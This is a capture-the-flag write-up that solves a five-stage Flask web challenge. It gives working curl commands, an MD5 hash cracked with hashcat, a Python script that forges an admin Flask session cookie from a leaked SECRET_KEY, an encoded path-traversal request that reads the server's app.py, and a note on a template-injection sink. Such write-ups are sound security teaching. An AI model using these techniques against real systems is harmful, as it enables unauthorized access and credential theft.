# InvestiGate Portal 1-5 — Chain Writeup

Target: `https://nm04.bootupctf.net:8000/` (single Flask app, shared instance across portals 1-5).
Solved 2026-05-25 by reading source, no SSTI/RCE/SQLi needed.

## Summary of flags

| # | Flag | Vector |
|---|------|--------|
| 1 | `mne{b4ck_robotT0_th3_b4sic5}` | `robots.txt` exposes it |
| 2 | `mne{sm4ll_things_b1g_consqu3nce5}` | SQLite backup `users.bak` reveals dev creds & flag |
| 3 | `mne{r4ad1ng_s0urce_n3v3r_hurt5}` | Inline comment in `/static/api.js` |
| 4 | `mne{k33p_y0ur_l0gs_cl0s3_but_n0t_th4t_cl0s3}` | Returned as `FLAG4` HTTP response header from `/api/admin/getLogs` (decorator is `user_api_required`, intended-vulnerable) |
| 5 | `mne{d0nt_dr0p_y0ur_k3ys}` | Forge Flask session with leaked SECRET_KEY → admin → `/api/admin/getFlag` |

## Detailed chain

### Portal 1 — robots.txt
```
$ curl https://nm04.bootupctf.net:8000/robots.txt
User-agent: *
Disallow: /tmpfiles/all

FLAG1: mne{b4ck_robotT0_th3_b4sic5}
```
Hint: also reveals the `/tmpfiles/all` endpoint, which is the gateway to Portal 2.

### Portal 2 — Backup SQLite database
`/tmpfiles/all` returns a hand-rolled directory listing of `./tmp/`. Subdirs are exposed at `/tmp/<dir>/`. Only `backup/` has anything: `users.bak`.

It's a SQLite 3 file. Schema:
```sql
CREATE TABLE users (id, username, password, created_at, email, is_active, role, FLAG)
```
Rows:
- `dev` / `18a7763dbf76f40177acbfda65e84214` (MD5 of `samtheman`) / role=`user` / **FLAG2: `mne{sm4ll_things_b1g_consqu3nce5}`**
- `admin` / `2365bfe9e7e5331dd2daf29d50bb0903` (uncracked by rockyou+best66) / role=`administrator` / FLAG=`-`

Cracked dev hash with `hashcat -m 0 -a 0 <hash> rockyou.txt` (RTX 5090, <1 s).

### Portal 3 — Source comment in /static/api.js
After logging in as `dev:samtheman`, `/profile` references `static/api.js` and `static/adminapi.js`. The user-facing one ends with:
```js
// FLAG3: mne{r4ad1ng_s0urce_n3v3r_hurt5}
```

### Portal 4 — Vulnerable decorator on /api/admin/getLogs
`adminapi.js` lists three admin endpoints. `/api/admin/getLogs` is decorated `@user_api_required` (comment in source: `#intended, this is vulnerable.`), so a normal user's API key is enough.

```
$ curl -I -b dev_cookies -H "API-Key: KQ7VJKY2YI5Z5RSN0U9NIURF22J8P63B" \
     https://nm04.bootupctf.net:8000/api/admin/getLogs
...
flag4: mne{k33p_y0ur_l0gs_cl0s3_but_n0t_th4t_cl0s3}
```
The flag is in the response *header*, not the body.

The log file itself is a 600-line audit trail where **every entry leaks the Flask SECRET_KEY**:
```
2025-02-28 12:59:19,523 - INFO - User 'dev' - GET /profile - Session Cookie: session (truncated), signed with key: 'GVhVLraKTxXEHHWArrLp'
```
This is the pivot for Portal 5.

### Portal 5 — Forge admin session with leaked SECRET_KEY
```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask(__name__); app.config["SECRET_KEY"] = "GVhVLraKTxXEHHWArrLp"
ser = SecureCookieSessionInterface().get_signing_serializer(app)
print(ser.dumps({"logged_in": True, "username": "admin", "usertype": "administrator"}))
```
Cookie: `.eJyrVsrJT09PTYnPzFOyKikqTdVRKi1OLcpLzE1VslJKTMnNzFOCCJVUFsCFMotLihJL8ouUagHnoxcm.ahSveQ.4rwW-2T91aogaFSm2Pb-0tRkWmU`

Hit `/api/getApiKey` to get the admin key `B9O8MXV4TKTGWJ37H8ZGYFF5R2IAM6CH`, then:
```
$ curl -b "session=<forged>" -H "API-Key: B9O8MXV4TKTGWJ37H8ZGYFF5R2IAM6CH" \
     https://nm04.bootupctf.net:8000/api/admin/getFlag
Well done, here is your FLAG5: mne{d0nt_dr0p_y0ur_k3ys}
```

## Bonus finding (not required for any flag)

The `/tmp/<path:subpath>/` route does no path sanitization:
```
$ curl https://nm04.bootupctf.net:8000/tmp/%2e%2e/
<h1>Index of /tmp/../</h1>
... app.py, custom_logs.log, logging_config.py, requestlog.log ...

$ curl https://nm04.bootupctf.net:8000/tmp/%2e%2e/app.py    # full source
```
That `..%2f` traversal is what let us read `app.py` and the bare-strings flag for Portal 4. The Portal 4 challenge can also be solved without source if you recognise the `/api/admin/getLogs` decorator mismatch by reading `adminapi.js` and trying the user API key.

Additionally, `app.py` confirms SSTI is reachable via `render_template_string` on the `subpath` arg in `list_subdir`, e.g. `/tmp/{{7*7}}/` would template-render — but it is not needed since the SECRET_KEY is already exposed via the logs endpoint.

## Files saved

- `users.bak` — original SQLite backup
- `app.py` — full server source (pulled via path traversal)
- `evidence.json` — admin case-evidence dump
- `forge.py` — Flask session forger
- `hashes.txt`, `cracked.txt` — MD5 cracking artifacts
- `flag.txt` in each `investigate_portal_<n>/` dir
